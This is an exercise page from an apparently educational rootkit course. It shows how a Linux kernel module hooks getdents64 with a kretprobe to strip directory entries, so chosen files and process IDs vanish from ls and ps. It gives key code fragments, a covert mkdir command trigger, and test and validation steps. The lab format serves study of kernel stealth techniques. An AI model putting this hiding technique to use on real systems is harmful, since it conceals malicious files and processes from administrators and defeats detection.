# L11: Directory Entry Filter

This is the hardest exercise.
It teaches the core technique behind hiding files and processes from every
userspace tool.

## How ls works

When `ls /tmp` runs, it calls `getdents64(fd, buf, size)`.
The kernel fills `buf` with an array of `linux_dirent64` records and returns the
total byte count.
`ls` then prints the names from those records.

If you remove a record from the buffer before `ls` reads it, that file vanishes
from the listing.
The file still exists on disk; only the directory listing is filtered.

## The dirent buffer

```text
  |<-- d_reclen -->|<-- d_reclen -->|<-- d_reclen -->|
  +---------+------+---------+------+---------+------+
  | d_ino   |      | d_ino   |      | d_ino   |      |
  | d_off   |      | d_off   |      | d_off   |      |
  | d_reclen| name | d_reclen| name | d_reclen| name |
  | d_type  |      | d_type  |      | d_type  |      |
  +---------+------+---------+------+---------+------+
```

Records are variable-length.
`d_reclen` includes padding to align the next record.
You advance by `d_reclen`, never by `sizeof(struct linux_dirent64)`.
There is no record count; the return value is the total byte count.
Walk until you consume all bytes.

## Interception

Kretprobe on `__x64_sys_getdents64`.
Entry handler saves the userspace buffer pointer.
Return handler does the filtering:

```text
  ls /tmp
    |
    v
  getdents64(fd, ubuf, size)
    |
    v
  __x64_sys_getdents64        <-- kretprobe
    |
  entry: save ubuf from inner pt_regs (uregs->si)
    |
  kernel fills ubuf with dirent records
    |
  return: copy_from_user(kbuf, ubuf, total)
         walk kbuf by d_reclen
         memmove out hidden entries
         copy_to_user(ubuf, kbuf, new_total)
         regs_set_return_value(regs, new_total)
    |
    v
  ls sees filtered listing
```

`__x64_sys_getdents64` is a syscall wrapper: its arguments are inside nested
pt_regs (double indirection).
Use `regs_get_kernel_argument` to get the inner regs, then read `uregs->si` for
the buffer pointer.

## The trap

`d_reclen` is variable-length.
If you advance by `sizeof(struct linux_dirent64)` instead of `d_reclen`, you
land in the middle of a name field and read garbage as the next record's
metadata.
This corrupts the buffer and can crash userspace or the kernel.

Also: when removing an entry with `memmove`, use `memmove` not `memcpy`.
The source and destination regions overlap.

## You write

`main.c`, ~315 lines:

- `struct rk_getdents_data` for kretprobe instance data (ubuf pointer)
- `rk_getdents_entry()`: save ubuf from inner pt_regs (`uregs->si`)
- `rk_getdents_return()`: copy, walk, memmove filter, write back
- `should_hide_dirent()`: check against file_targets and pid_targets
- mkdir dispatcher for `h.f`/`u.f`/`h.i`/`u.i` commands
- Two target lists: `file_targets` and `pid_targets`

## API

```c
#include <linux/dirent.h>      // struct linux_dirent64
#include <linux/kprobes.h>     // kretprobe
#include <linux/uaccess.h>     // copy_from_user, copy_to_user, put_user

// Syscall wrapper: inner pt_regs (double indirection)
struct pt_regs *uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
void __user *ubuf = (void __user *)uregs->si;

// Buffer walk
struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf + off);
off += d->d_reclen;  // NOT sizeof(*d)

// Remove entry (overlapping regions)
memmove(kbuf + off, kbuf + off + d->d_reclen, remaining);
new_total -= d->d_reclen;

// Write filtered buffer back to userspace
copy_to_user(data->ubuf, kbuf, new_total);
regs_set_return_value(regs, new_total);
```

## Test it

The module is pre-loaded.
You are logged in as student.

```
$ dmesg | tail -1
rklings: loaded
$ touch /tmp/hidden
$ ls /tmp/ | grep hidden
hidden
$ mkdir rklings.h.f.hidden
$ ls /tmp/ | grep hidden
(no output)
$ cat /tmp/hidden
(works, file still exists on disk)
$ mkdir rklings.u.f.0
$ ls /tmp/ | grep hidden
hidden
```

PID hiding:

```
$ sleep 999 &
[1] 1234
$ ps aux | grep 1234
student  1234  0.0  sleep 999
$ mkdir rklings.h.i.1234
$ ps aux | grep 1234
(no output)
$ kill 1234
(still works, process exists)
```

## Validate

```
$ rklings validate l11
  [+] module loaded
  [+] file hidden from ls
  [+] hidden file still accessible via cat
  [+] PID hidden from ps
  [+] hidden process still running
  [+] unhide restores visibility
  PASS
```

## Next

L12 applies the same filtering pattern to read, removing matching lines from
text output so strings vanish from cat, grep, and any file reader.
